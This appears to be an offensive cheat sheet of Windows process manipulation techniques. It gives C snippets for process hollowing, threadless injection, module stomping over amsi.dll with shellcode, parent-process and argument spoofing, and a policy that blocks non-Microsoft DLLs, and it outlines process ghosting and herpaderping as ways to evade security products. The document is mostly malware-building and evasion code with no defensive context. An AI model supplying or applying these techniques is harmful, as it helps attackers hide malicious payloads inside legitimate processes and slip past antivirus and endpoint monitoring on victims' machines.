# Process Manipulation Techniques

## Process Hollowing
```c
CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
GetThreadContext(pi.hThread, &ctx);
PVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, pRemote, payload, payloadSize, NULL);
ctx.Rcx = (DWORD64)pRemote;
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

## Threadless Injection
```c
BOOL FindMemoryHole(HANDLE hProcess, PULONG_PTR puAddress, ULONG_PTR uExportAddr, SIZE_T sPayloadSize) {
    ULONG_PTR uStart = uExportAddr - 0x70000000;
    ULONG_PTR uEnd = uExportAddr + 0x70000000;
    MEMORY_BASIC_INFORMATION mbi;
    while (uStart < uEnd) {
        VirtualQueryEx(hProcess, (PVOID)uStart, &mbi, sizeof(mbi));
        if (mbi.State == MEM_FREE && mbi.RegionSize >= sPayloadSize) {
            *puAddress = (ULONG_PTR)VirtualAllocEx(hProcess, (PVOID)uStart, sPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (*puAddress) return TRUE;
        }
        uStart += mbi.RegionSize;
    }
    return FALSE;
}
```

## Module Stomping
```c
HMODULE hMod = LoadLibraryExA("C:\\Windows\\System32\\amsi.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
PIMAGE_SECTION_HEADER pTxt = NULL;
DWORD dwOld;
VirtualProtect((PBYTE)hMod + pTxt->VirtualAddress, pTxt->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOld);
memcpy((PBYTE)hMod + pTxt->VirtualAddress, shellcode, size);
```

## PPID Spoofing
```c
HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
SIZE_T ulSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &ulSize);
PPROC_THREAD_ATTRIBUTE_LIST pAttr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulSize);
InitializeProcThreadAttributeList(pAttr, 1, 0, &ulSize);
UpdateProcThreadAttribute(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
STARTUPINFOEXA siEx = {0};
siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
siEx.lpAttributeList = pAttr;
CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED|CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi);
```

## Block DLL Policy
```c
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
UpdateProcThreadAttribute(pAttr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
```

## Process Argument Spoofing
```c
CreateProcessA(NULL, "notepad.exe fakearg.txt", ..., CREATE_SUSPENDED, ..., &pi);
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
WriteProcessMemory(pi.hProcess, cmdLineBuffer, L"real_command", ...);
ResumeThread(pi.hThread);
```

## Ghost Process Injection
- Create file, write malicious PE, mark for deletion
- Create section from delete-pending file
- Create process from section
- File deleted but process runs with original content

## Herpaderping
- Create file → write malicious PE → create section → overwrite file with benign PE → create process
- Security products see benign file on disk, but process runs original image from section
